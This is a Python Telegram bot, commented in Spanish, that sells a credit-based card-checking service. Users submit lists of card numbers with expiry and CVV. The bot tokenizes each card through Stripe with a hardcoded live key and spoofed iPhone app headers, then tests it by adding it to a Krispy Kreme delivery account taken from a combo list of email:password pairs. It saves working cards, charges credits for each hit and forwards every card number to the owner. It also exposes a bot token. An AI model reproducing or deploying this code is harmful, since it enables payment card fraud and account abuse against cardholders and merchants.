#!/usr/bin/env python3
from datetime import datetime
import io
import json
import os
from pathlib import Path
import queue
import random
import re
import sys
import threading
import time
from typing import List
import requests
from telebot import apihelper, TeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# Activar reintentos automáticos en fallas de red de Telegram
apihelper.RETRY_ON_ERROR = True

# Detectar ruta (Railway o Local)
if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(__file__)

# =========================================================
# CONFIGURACIÓN DESDE VARIABLES DE ENTORNO (RAILWAY)
# =========================================================
TOKEN = os.getenv("TOKEN", "8531578967:AAEZykF8G26VsWB2C27h-ign6P3X7-Xrx0s")
PROPIETARIO_ID_ENV = os.getenv("PROPIETARIO_ID", "5504611412")
try:
    PROPIETARIO_ID = int(PROPIETARIO_ID_ENV)
except ValueError:
    PROPIETARIO_ID = 5504611412

bot = TeleBot(TOKEN)

# Estado global del bot
estado = {
    "en_progreso": False,
    "detener": False,
    "total": 0,
    "procesados": 0,
    "exitosos": 0,
    "fallidos": 0,
    "lista_exitos": [],
    "lista_fallos": [],
    "usuario_actual": "Anónimo",
    "chat_id_actual": None,
    "user_id_actual": None
}
estado_lock = threading.Lock()
cola_tareas = queue.Queue()
usuarios_espera_alerta = set()
espera_lock = threading.Lock()

# Contadores globales
contador_fail = 0
contador_success = 0
contador_expiradas = 0

DATA_DIR = os.path.join(BASE_DIR, "data") if os.path.exists(os.path.join(BASE_DIR, "data")) else BASE_DIR
os.makedirs(DATA_DIR, exist_ok=True)

ARCHIVO_CLIENTES = os.path.join(DATA_DIR, "clientes.txt")
LIVES_FILE = os.path.join(DATA_DIR, "lives.txt")
FAIL_FILE = os.path.join(DATA_DIR, "fail.txt")

# 👇 ¡Agrega esta línea aquí para solucionar el error! 👇
creditos_lock = threading.Lock()

COSTO_SUCCESS = 4
COSTO_FAIL = 0
CREDITOS_INICIALES = 40  # 🎁 Créditos gratis para nuevos usuarios


def notificar_propietario(mensaje):
    """Envía un mensaje de log/reporte al propietario."""
    try:
        bot.send_message(PROPIETARIO_ID, mensaje, parse_mode="HTML")
    except Exception as e:
        print(f"Error al notificar al propietario: {e}")


def cargar_clientes():
    clientes = {}
    if not os.path.exists(ARCHIVO_CLIENTES):
        return clientes
    with open(ARCHIVO_CLIENTES, "r", encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea or linea.startswith("#"):
                continue
            partes = [p.strip() for p in linea.split(",")]
            if len(partes) >= 3:
                uid, uname, creds = partes[:3]
                try:
                    clientes[uid] = {"username": uname, "creditos": int(creds)}
                except ValueError:
                    pass
    return clientes


def guardar_clientes(clientes):
    with open(ARCHIVO_CLIENTES, "w", encoding="utf-8") as f:
        for uid, data in clientes.items():
            f.write(f"{uid},{data['username']},{data['creditos']}\n")


def obtener_saldo(user_id):
    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        if user_str in clientes:
            return clientes[user_str]["creditos"]
        return None


def registrar_usuario(user_id, username):
    """Registra al usuario y le otorga 40 créditos gratis si es su primera vez."""
    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        clean_uname = (username or "anonimo").lstrip("@")
        
        if user_str in clientes:
            # Actualizar username por si cambió
            if clientes[user_str]["username"] != clean_uname:
                clientes[user_str]["username"] = clean_uname
                guardar_clientes(clientes)
            return False, clientes[user_str]["creditos"]
        
        clientes[user_str] = {"username": clean_uname, "creditos": CREDITOS_INICIALES}
        guardar_clientes(clientes)

        notificar_propietario(
            f"👤 <b>NUEVO REGISTRO EN EL BOT (+40 CRÉDITOS)</b>\n"
            f"• <b>Usuario:</b> @{clean_uname}\n"
            f"• <b>ID:</b> <code>{user_id}</code>\n"
            f"• <b>Bono otorgado:</b> 40 créditos gratis"
        )
        return True, CREDITOS_INICIALES


def modificar_creditos_por_identificador(identificador, cantidad):
    """Permite sumar o restar créditos buscando por ID o Username."""
    with creditos_lock:
        clientes = cargar_clientes()
        id_buscado = str(identificador).strip().lstrip("@")
        
        user_key = None
        # Buscar por ID exacto
        if id_buscado in clientes:
            user_key = id_buscado
        else:
            # Buscar por Username
            for uid, data in clientes.items():
                if data["username"].lower() == id_buscado.lower():
                    user_key = uid
                    break
        
        if not user_key:
            return False, "Usuario no encontrado en la base de datos."
        
        clientes[user_key]["creditos"] += cantidad
        if clientes[user_key]["creditos"] < 0:
            clientes[user_key]["creditos"] = 0
            
        nuevo_saldo = clientes[user_key]["creditos"]
        guardar_clientes(clientes)
        return True, (user_key, clientes[user_key]["username"], nuevo_saldo)


def cobrar_creditos_por_resultado(user_id, es_exito):
    costo = COSTO_SUCCESS if es_exito else COSTO_FAIL
    if costo == 0:
        return obtener_saldo(user_id) or 0, 0

    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        if user_str in clientes:
            clientes[user_str]["creditos"] = max(
                0, clientes[user_str]["creditos"] - costo
            )
            nuevo_saldo = clientes[user_str]["creditos"]
            guardar_clientes(clientes)
            return nuevo_saldo, costo
        return 0, costo


LIVES_FILE = os.path.join(BASE_DIR, "lives.txt")
FAIL_FILE = os.path.join(BASE_DIR, "fail.txt")


def validar_tarjeta(cc, mes, anio, cvv):
    if not (cc.isdigit() and len(cc) in [15, 16]):
        return False, "FORMATO_INVALIDO_CC"
    if not (mes.isdigit() and 1 <= int(mes) <= 12):
        return False, "FORMATO_INVALIDO_MES"
    if len(anio) == 2:
        anio_4 = f"20{anio}"
    elif len(anio) == 4:
        anio_4 = anio
    else:
        return False, "FORMATO_INVALIDO_ANIO"
    if not (cvv.isdigit() and len(cvv) in [3, 4]):
        return False, "FORMATO_INVALIDO_CVV"

    ahora = datetime.now()
    anio_int = int(anio_4)
    mes_int = int(mes)

    if anio_int < ahora.year or (anio_int == ahora.year and mes_int < ahora.month):
        return False, "EXPIRADA"

    return True, anio_4


def notificar_usuarios_en_espera():
    with espera_lock:
        if not usuarios_espera_alerta:
            return
        for u_id in list(usuarios_espera_alerta):
            try:
                bot.send_message(
                    u_id, 
                    "🔔 <b>¡El sistema ya está libre!</b> Ya puedes enviar tu nuevo lote de tarjetas.", 
                    parse_mode="HTML"
                )
            except Exception:
                pass
        usuarios_espera_alerta.clear()


def obtener_menu_principal():
    markup = InlineKeyboardMarkup()
    btn_check = InlineKeyboardButton("⚡ CHECK_CCS (API STRIPE)", callback_data="btn_check_ccs")
    btn_saldo = InlineKeyboardButton("💰 Mis Créditos", callback_data="btn_saldo")
    btn_instrucciones = InlineKeyboardButton("📖 Instrucciones", callback_data="btn_instrucciones")
    btn_formato = InlineKeyboardButton("📌 Formato Correcto", url="https://t.me/filtro_carbon_bot")
    btn_comprar = InlineKeyboardButton("🛒 Comprar", url="https://t.me/Juanper33z")
    btn_grupo = InlineKeyboardButton("📢 Mi Grupo", url="https://t.me/+kIN_CgyaWP5lZDUx")

    markup.row(btn_check, btn_saldo)
    markup.row(btn_instrucciones, btn_formato)
    markup.row(btn_comprar, btn_grupo)
    return markup


def generar_resumen_proceso(user_id=None):
    saldo_actual = obtener_saldo(user_id) if user_id else "N/A"
    resumen = (
        "📊 <b>RESUMEN DEL PROCESO</b>\n"
        "─────────────────────────\n"
        f"<b>Total procesadas:</b> {estado['procesados']}/{estado['total']}\n"
        f"✅ <b>SUCCESS:</b> {estado['exitosos']}\n"
        f"❌ <b>FAIL:</b> {estado['fallidos']}\n"
        f"⏳ <b>EXPIRADAS:</b> {contador_expiradas}\n"
        "─────────────────────────\n"
        f"💰 <b>Saldo actual:</b> {saldo_actual} créditos\n"
    )
    return resumen


def generar_informe_propietario():
    saldo_usuario = obtener_saldo(estado["user_id_actual"]) if estado["user_id_actual"] else "N/A"
    
    informe = f"🏁 <b>REPORTES Y RESULTADOS DE LOTE</b>\n"
    informe += f"👤 <b>Usuario:</b> @{estado['usuario_actual']} (<code>{estado['user_id_actual']}</code>)\n"
    informe += f"💰 <b>Saldo restante:</b> {saldo_usuario} cr.\n"
    informe += f"📊 <b>Totales:</b> {estado['procesados']}/{estado['total']} (✅ {estado['exitosos']} | ❌ {estado['fallidos']})\n\n"

    informe += "🟢 <b>ÉXITOS (LIVES):</b>\n"
    if estado["lista_exitos"]:
        for item in estado["lista_exitos"]:
            informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
    else:
        informe += "<i>Ninguna tarjeta aprobada.</i>\n"

    informe += "\n🔴 <b>FALLOS (FAILS):</b>\n"
    if estado["lista_fallos"]:
        for item in estado["lista_fallos"][:25]:
            informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
        if len(estado["lista_fallos"]) > 25:
            informe += f"<i>...y {len(estado['lista_fallos']) - 25} fallos más.</i>\n"
    else:
        informe += "<i>Sin fallos registrados.</i>\n"

    return informe


def solicitar_datos_ccs(chat_id, user_id):
    saldo = obtener_saldo(user_id)
    if saldo is None:
        bot.send_message(chat_id, "❌ No estás registrado. Escribe /start primero.")
        return

    if saldo <= 0:
        bot.send_message(
            chat_id,
            f"⛔ No tienes créditos disponibles (Saldo: <b>{saldo}</b>). Contacta soporte.",
            parse_mode="HTML",
        )
        return

    with estado_lock:
        if estado["en_progreso"]:
            markup_aviso = InlineKeyboardMarkup()
            markup_aviso.add(InlineKeyboardButton("🔔 Avisarme cuando esté libre", callback_data="btn_avisar"))
            bot.send_message(
                chat_id,
                "⚠️ Ya hay un proceso de verificación en ejecución. ¿Deseas que te avise en cuanto quede desocupado?",
                reply_markup=markup_aviso,
            )
            return

    msg = bot.send_message(
        chat_id,
        f"📋 <b>Gate Stripe API Active</b>\n"
        f"💳 <b>Saldo disponible: {saldo} créditos</b>\n"
        f"<i>(Costo: 4 créditos por SUCCESS | Fails totalmente GRATIS)</i>\n\n"
        "Envía tus tarjetas en formato <code>CC|MM|AAAA|CVV</code> o sube un archivo <code>.txt</code>:\n"
        "<i>(Si tu lista está desordenada, puedes formatearla con @filtro_carbon_bot)</i>",
        parse_mode="HTML",
    )
    bot.register_next_step_handler(msg, recibir_datos_lote)


def procesar_tarjeta_api(correo, password, linea_cc):
    try:
        cc_partes = linea_cc.split("|")
        cc = cc_partes[0]
        mm = cc_partes[1]
        yyyy = cc_partes[2]
        ccv = cc_partes[3]
    except IndexError:
        return False, "Formato incorrecto en la línea de tarjeta"

    ultimos_4 = cc[-4:]
    timestamp_str = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")

    signature = "536d78c71f0010d53a48beb0d6935c47"
    credential_pwd = (
        "JN84D5Gvhn946voUKVivpiPKZKjpvK0qPSVo/A285gNDM+OuHRnV/+"
        "HyiRIQGmy67lleTpPG7M35VJe15FLrZA=="
    )

    session = requests.Session()

    stripe_url = "https://api.stripe.com/v1/tokens"
    stripe_headers = {
        "Host": "api.stripe.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Stripe-Version": "2020-08-27",
        "User-Agent": "KrispyKreme/1 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
        "X-Stripe-User-Agent": '{"type":"iPad11,6","os_version":"18.4","bindings_version":"24.14.0","vendor_identifier":"3B576E16-E88C-4CBC-A3A0-E0490F33025C","lang":"objective-c","model":"iPad"}',
        "Authorization": "Bearer pk_live_51OjVj8FXiwuOsp7TTDvOZMPwEf81Jf8vmLt0pj9Mip3RcjHQIMyV4FIV9UKdIKY9WBY0GiFd1Oo2NY4Dpd0L3VrR00XBj375RZ",
    }
    stripe_payload = f"card[cvc]={ccv}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[name]=Juan%20Perez&card[number]={cc}&payment_user_agent=stripe-ios/24.14.0%3B%20variant.payments-ui%3B%20STPPaymentCardTextField"

    try:
        resp_stripe = session.post(stripe_url, headers=stripe_headers, data=stripe_payload, timeout=15)
        stripe_json = resp_stripe.json()
        card_token_id = stripe_json.get("id")
        if not card_token_id:
            error_msg = stripe_json.get("error", {}).get("message", "Error al generar token en Stripe")
            return False, error_msg
    except Exception as e:
        return False, f"Excepción en Stripe: {e}"

    krispy_url = "https://krispykreme.adomicil.io/Payment/Card/Add"
    krispy_payload = {
        "Data": {
            "Card": {
                "CardIsCredit": True,
                "CardNoExt": "",
                "CardStreet": "",
                "CardExpirationYear": yyyy,
                "DeviceId": card_token_id,
                "CardLast4": ultimos_4,
                "CardExpirationMonth": mm,
                "CardPhone": "2481709250",
                "CardNoInt": "",
                "CardZipCode": "",
                "CardEmail": correo,
                "CardNeighborhood": "",
                "CardToken": card_token_id,
                "CardMunicipality": "",
                "CardBankName": "Jpmorgan Chase Bank N.A.",
                "CardBrand": "visa",
                "CardHolderName": "Juan Perez",
                "Cardcvv": ccv,
            }
        },
        "Auth": {
            "CredentialPlatform": "mail",
            "Signature": signature,
            "CredentialData": correo,
            "CredentialPwd": credential_pwd,
            "Timestamp": timestamp_str,
            "CredentialLogin": correo,
        },
    }
    krispy_headers = {
        "Host": "krispykreme.adomicil.io",
        "Content-Type": "application/json; charset=UTF-8",
        "x-language": "es",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
        "User-Agent": "KrispyKreme/1 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
    }

    try:
        resp_krispy = session.post(
            krispy_url,
            headers=krispy_headers,
            data=json.dumps(krispy_payload),
            timeout=15,
        )
        krispy_json = resp_krispy.json()
        response_data = krispy_json.get("Response", {})
        return_code = response_data.get("ReturnCode", 500)
        return_message = response_data.get("ReturnMessage", "Desconocido")

        if return_code == 200 or "exito" in return_message.lower():
            with open(LIVES_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {return_message}\n")
            return True, return_message
        else:
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {return_message}\n")
            return False, return_message

    except Exception as e:
        err_msg = f"Error en Krispy Kreme: {e}"
        with open(FAIL_FILE, "a", encoding="utf-8") as f:
            f.write(f"{linea_cc} | {err_msg}\n")
        return False, err_msg


def worker_principal():
    while True:
        if estado["detener"]:
            time.sleep(0.5)
            continue

        if cola_tareas.empty():
            time.sleep(1)
            continue

        tarea = cola_tareas.get()
        try:
            chat_id = tarea.get("chat_id")
            user_id = tarea.get("user_id")
            linea_cc = tarea.get("linea_cc")
            correo = tarea.get("correo")
            password = tarea.get("password")

            # 👇 VALIDACIÓN NUEVA: Verificar si aún tiene créditos antes de procesar cada tarjeta
            if user_id:
                saldo_actual = obtener_saldo(user_id)
                if saldo_actual is None or saldo_actual <= 0:
                    # Detener el lote para este usuario de inmediato
                    with estado_lock:
                        estado["en_progreso"] = False
                    bot.send_message(
                        chat_id, 
                        "⛔ <b>Proceso pausado:</b> Te has quedado sin créditos disponibles durante el chequeo.", 
                        parse_mode="HTML"
                    )
                    break # Sale del bucle y detiene el lote

            exito, mensaje_resultado = procesar_tarjeta_api(correo, password, linea_cc)

            if user_id:
                cobrar_creditos_por_resultado(user_id, exito)

            with estado_lock:
                estado["procesados"] += 1
                if exito:
                    estado["exitosos"] += 1
                    estado["lista_exitos"].append({"cc": linea_cc, "msg": mensaje_resultado})
                else:
                    estado["fallidos"] += 1
                    estado["lista_fallos"].append({"cc": linea_cc, "msg": mensaje_resultado})

            notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_resultado)

            status_txt = "✅ ÉXITO" if exito else "❌ FAIL"
            notificar_propietario(
                f"⚙️ <b>[{estado['procesados']}/{estado['total']}]</b> @{estado['usuario_actual']}\n"
                f"💳 <code>{linea_cc}</code>\n"
                f"📌 <b>{status_txt}:</b> {mensaje_resultado[:80]}"
            )

            with estado_lock:
                if estado["procesados"] >= estado["total"] or estado["detener"]:
                    estado["en_progreso"] = False
                    if estado["procesados"] >= estado["total"]:
                        resumen_final = generar_resumen_proceso(user_id)
                        bot.send_message(
                            chat_id, 
                            "🏁 <b>¡Proceso completado con éxito!</b>\n\n" + resumen_final, 
                            parse_mode="HTML"
                        )
                        notificar_propietario(generar_informe_propietario())
                        notificar_usuarios_en_espera()

        except Exception as e:
            print(f"Error en worker HTTP: {e}")
        finally:
            cola_tareas.task_done()
        
        time.sleep(1)


def notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_detectado):
    if not chat_id:
        return
    status_texto = "SUCCESS✅" if exito else "FAIL❌"
    mensaje = f"STATUS: {status_texto}\n💳 <code>{linea_cc}</code>\n💬 <b>Mensaje:</b> <i>{mensaje_detectado[:100]}</i>"
    try:
        bot.send_message(chat_id, mensaje, parse_mode="HTML")
    except Exception:
        pass


def recibir_datos_lote(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Anonimo"
    texto_entrada = ""

    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            texto_entrada = downloaded_file.decode("utf-8", errors="ignore")
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error al leer el archivo: {e}")
            return
    elif message.text:
        texto_entrada = message.text

    if not texto_entrada.strip():
        bot.send_message(chat_id, "⚠️ No se recibió texto válido.")
        return

    patron = re.compile(r'(\d{15,16})[|/]?\s*(\d{2})[|/]\s*(\d{2,4})[|/]\s*(\d{3,4})')

    tarjetas_validas = []
    tarjetas_rechazadas = []

    for linea in texto_entrada.splitlines():
        linea = linea.strip()
        if not linea:
            continue
        coincidencia = patron.search(linea)
        if not coincidencia:
            tarjetas_rechazadas.append((linea, "FORMATO_MAL"))
            continue

        cc, mes, anio, cvv = coincidencia.groups()
        es_valida, resultado = validar_tarjeta(cc, mes, anio, cvv)

        if es_valida:
            linea_limpia = f"{cc}|{mes}|{resultado}|{cvv}"
            tarjetas_validas.append(linea_limpia)
        else:
            tarjetas_rechazadas.append((linea, resultado))

    if tarjetas_rechazadas:
        reporte_descartes = "⚠️ <b>Tarjetas omitidas (Sin cobro de créditos):</b>\n\n"
        for item, motivo in tarjetas_rechazadas[:20]:
            reporte_descartes += f"❌ <code>{item}</code> ➔ <b>{motivo}</b>\n"
        bot.send_message(chat_id, reporte_descartes, parse_mode="HTML")

    if not tarjetas_validas:
        bot.send_message(
            chat_id, 
            "⛔ Ninguna tarjeta válida para procesar.\n\n"
            "💡 Si tienes un texto sin formato, usa @filtro_carbon_bot para ordenarlo.",
            parse_mode="HTML"
        )
        return

    combos_path = os.path.join(BASE_DIR, "COMBO.txt")
    if not os.path.exists(combos_path):
        bot.send_message(chat_id, "❌ No se encontró el archivo `combo.txt` en el servidor.")
        return
    
    with open(combos_path, "r", encoding="utf-8") as f:
        combos = [l.strip() for l in f if ":" in l and l.strip()]

    if not combos:
        bot.send_message(chat_id, "❌ El archivo `combo.txt` está vacío.")
        return

    with estado_lock:
        estado["en_progreso"] = True
        estado["detener"] = False
        estado["total"] = len(tarjetas_validas)
        estado["procesados"] = 0
        estado["exitosos"] = 0
        estado["fallidos"] = 0
        estado["lista_exitos"] = []
        estado["lista_fallos"] = []
        estado["usuario_actual"] = username
        estado["chat_id_actual"] = chat_id
        estado["user_id_actual"] = user_id

    global contador_expiradas
    contador_expiradas += len([r for r in tarjetas_rechazadas if r[1] == "EXPIRADA"])

    for linea_cc in tarjetas_validas:
        linea_combo = random.choice(combos)
        try:
            correo, password = linea_combo.split(":", 1)
        except ValueError:
            continue

        cola_tareas.put({
            "linea_cc": linea_cc,
            "correo": correo.strip(),
            "password": password.strip(),
            "chat_id": chat_id,
            "user_id": user_id
        })

    bot.send_message(
        chat_id,
        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola (Stripe Gate API).",
        parse_mode="HTML"
    )

    notificar_propietario(
        f"🚀 <b>NUEVO CHEQUEO INICIADO</b>\n"
        f"• <b>Usuario:</b> @{username} (<code>{user_id}</code>)\n"
        f"• <b>Total de CCs:</b> {len(tarjetas_validas)}"
    )


@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid = message.from_user.id
    uname = message.from_user.username
    creado, saldo = registrar_usuario(uid, uname)

    msg = f"👋 ¡Hola {message.from_user.first_name}!\n\n"
    if creado:
        msg += f"🎉 <b>¡Bienvenido! Se te han otorgado {CREDITOS_INICIALES} créditos gratis</b> por registrarte.\n\n"
    msg += f"💰 *Tus créditos actuales:* {saldo}\n\nUsa el menú para navegar."
    bot.send_message(message.chat.id, msg, parse_mode="HTML", reply_markup=obtener_menu_principal())


@bot.message_handler(commands=["id", "me", "perfil"])
def cmd_mi_perfil(message):
    """Muestra al cliente su ID, su Username y sus créditos actuales."""
    uid = message.from_user.id
    uname = message.from_user.username or "Sin usuario"
    # Asegurar registro si no estaba
    registrar_usuario(uid, message.from_user.username)
    saldo = obtener_saldo(uid)

    texto = (
        "👤 <b>TUS DATOS DE PERFIL</b>\n"
        "─────────────────────────\n"
        f"• <b>Nombre:</b> {message.from_user.first_name}\n"
        f"• <b>Username:</b> @{uname}\n"
        f"• <b>ID de Telegram:</b> <code>{uid}</code>\n"
        f"• <b>Créditos disponibles:</b> <b>{saldo}</b> 💰"
    )
    bot.send_message(message.chat.id, texto, parse_mode="HTML")


@bot.message_handler(commands=["creditos", "credit"])
def cmd_gestion_creditos(message):
    """Comando exclusivo del admin para sumar o restar créditos usando ID o Username.
       Uso: /creditos <ID_o_Username> <cantidad>
       Ejemplo: /creditos 5504611412 +20  ó  /creditos @Juanper33z -10  ó  /creditos 5504611412 50
    """
    if message.from_user.id != PROPIETARIO_ID:
        bot.send_message(message.chat.id, "⛔ Comando exclusivo del administrador.")
        return

    partes = message.text.split()
    if len(partes) < 3:
        bot.send_message(
            message.chat.id,
            "⚠️ <b>Uso incorrecto del comando.</b>\n\n"
            "Formatos válidos:\n"
            "• <code>/creditos ID_o_Username +20</code> (para sumar)\n"
            "• <code>/creditos ID_o_Username -10</code> (para restar)\n"
            "• <code>/creditos ID_o_Username 50</code> (establece/suma directa)",
            parse_mode="HTML"
        )
        return

    identificador = partes[1]
    param_cant = partes[2]

    try:
        if param_cant.startswith("+"):
            operacion = "sumar"
            cantidad = int(param_cant[1:])
        elif param_cant.startswith("-"):
            operacion = "restar"
            cantidad = -int(param_cant[1:])
        else:
            operacion = "sumar"
            cantidad = int(param_cant)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Cantidad inválida. Debe ser un número entero (ej: <code>+20</code> o <code>-10</code>).", parse_mode="HTML")
        return

    exito, resultado = modificar_creditos_por_identificador(identificador, cantidad)
    if not exito:
        bot.send_message(message.chat.id, f"❌ {resultado}", parse_mode="HTML")
        return

    uid_afectado, uname_afectado, nuevo_saldo = resultado
    signo_str = f"+{cantidad}" if cantidad >= 0 else str(cantidad)

    bot.send_message(
        message.chat.id,
        f"✅ <b>CRÉDITOS ACTUALIZADOS CON ÉXITO</b>\n\n"
        f"• <b>Usuario:</b> @{uname_afectado}\n"
        f"• <b>ID:</b> <code>{uid_afectado}</code>\n"
        f"• <b>Modificación:</b> <code>{signo_str}</code> créditos\n"
        f"• <b>Nuevo saldo total:</b> <b>{nuevo_saldo}</b> créditos",
        parse_mode="HTML"
    )

    # Intentar notificar al cliente afectado de manera automática
    try:
        bot.send_message(
            int(uid_afectado),
            f"🔔 <b>¡El administrador ha actualizado tus créditos!</b>\n\n"
            f"• <b>Cambio:</b> <code>{signo_str}</code> créditos\n"
            f"• <b>Tu nuevo saldo:</b> <b>{nuevo_saldo}</b> créditos",
            parse_mode="HTML"
        )
    except Exception:
        pass


@bot.message_handler(commands=["anuncio", "broadcast"])
def cmd_anuncio(message):
    if message.from_user.id != PROPIETARIO_ID:
        bot.send_message(message.chat.id, "⛔ Comando exclusivo del propietario.")
        return

    texto_anuncio = ""
    if message.reply_to_message:
        texto_anuncio = message.reply_to_message.text or message.reply_to_message.caption
    else:
        partes = message.text.split(maxsplit=1)
        if len(partes) > 1:
            texto_anuncio = partes[1]

    if not texto_anuncio:
        bot.send_message(
            message.chat.id,
            "⚠️ <b>Uso correcto:</b>\n"
            "• <code>/anuncio Tu mensaje aquí</code>\n"
            "• O responde a un mensaje con <code>/anuncio</code>",
            parse_mode="HTML"
        )
        return

    clientes = cargar_clientes()
    if not clientes:
        bot.send_message(message.chat.id, "❌ No hay usuarios registrados.", parse_mode="HTML")
        return

    enviados = 0
    fallidos = 0
    
    msg_estado = bot.send_message(message.chat.id, "📢 <b>Enviando anuncio masivo...</b>", parse_mode="HTML")

    for uid in list(clientes.keys()):
        try:
            bot.send_message(
                int(uid),
                f"📢 <b>ANUNCIO DEL ADMINISTRADOR</b>\n\n{texto_anuncio}",
                parse_mode="HTML"
            )
            enviados += 1
            time.sleep(0.05)
        except Exception:
            fallidos += 1

    bot.edit_message_text(
        f"✅ <b>ANUNCIO ENVIADO CON ÉXITO</b>\n\n"
        f"• <b>Entregados:</b> {enviados}\n"
        f"• <b>Fallidos:</b> {fallidos}\n"
        f"• <b>Total en BD:</b> {len(clientes)}",
        chat_id=message.chat.id,
        message_id=msg_estado.message_id,
        parse_mode="HTML"
    )


@bot.message_handler(commands=['stop', 'detener', 'parar'])
def cmd_stop_proceso(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    with estado_lock:
        if not estado["en_progreso"]:
            bot.send_message(chat_id, "⚠️ No hay ningún proceso en ejecución.")
            return
        estado["detener"] = True
        estado["en_progreso"] = False

    while not cola_tareas.empty():
        try:
            cola_tareas.get_nowait()
            cola_tareas.task_done()
        except queue.Empty:
            break

    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido por el usuario.</b>", parse_mode="HTML")
    resumen_texto = generar_resumen_proceso(user_id)
    bot.send_message(chat_id, resumen_texto, parse_mode="HTML")
    
    notificar_propietario(f"🛑 <b>Proceso detenido manualmente</b> por @{message.from_user.username or 'Anonimo'}")
    notificar_usuarios_en_espera()


@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    if call.data == "btn_check_ccs":
        solicitar_datos_ccs(chat_id, user_id)
    elif call.data == "btn_saldo":
        saldo = obtener_saldo(user_id)
        bot.send_message(chat_id, f"💰 Tienes <b>{saldo}</b> créditos disponibles.", parse_mode="HTML")
    elif call.data == "btn_instrucciones":
        inst = (
            "📖 <b>GUÍA Y SISTEMA DE CRÉDITOS</b>\n\n"
            "💳 <b>Gate Activo:</b> Stripe API\n"
            "⚡ <b>Velocidad:</b> Ultra rápida por Peticiones HTTP.\n\n"
            "📌 <b>FORMATO ACEPTADO:</b>\n"
            "Puedes enviar una tarjeta o un archivo <code>.txt</code> en formato:\n"
            "<code>CC|MM|AAAA|CVV</code>\n\n"
            "💡 <i>Si tus datos no están limpios, usa el botón '📌 Formato Correcto' o entra a @filtro_carbon_bot para ordenarlos automáticamente.</i>\n\n"
            "💰 <b>REGLAS DE COBRO DE CRÉDITOS:</b>\n"
            "• 🎁 <b>Bono de Bienvenida:</b> 40 créditos gratis al registrarte.\n"
            "• ✅ <b>Éxito (SUCCESS):</b> Se cobran <b>4 créditos</b> por cada tarjeta aprobada.\n"
            "• ❌ <b>Fallo (FAIL):</b> Totalmente <b>GRATIS</b> (0 créditos descontados).\n"
            "• ⏳ <b>Expiradas / Formato Inválido:</b> Se descartan automáticamente antes de procesar sin costo.\n\n"
            "🔍 <b>COMANDOS DISPONIBLES:</b>\n"
            "• /id (o /me) ➔ Muestra tu ID, usuario y créditos."
        )
        bot.send_message(chat_id, inst, parse_mode="HTML")
    elif call.data == "btn_avisar":
        with espera_lock:
            usuarios_espera_alerta.add(chat_id)
        bot.send_message(chat_id, "🔔 Te notificaremos cuando el bot esté libre.", parse_mode="HTML")


if __name__ == "__main__":
    threading.Thread(target=worker_principal, daemon=True, name="Worker-HTTP").start()
    print("🤖 Bot de Telegram (Railway Ready) en marcha...")
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
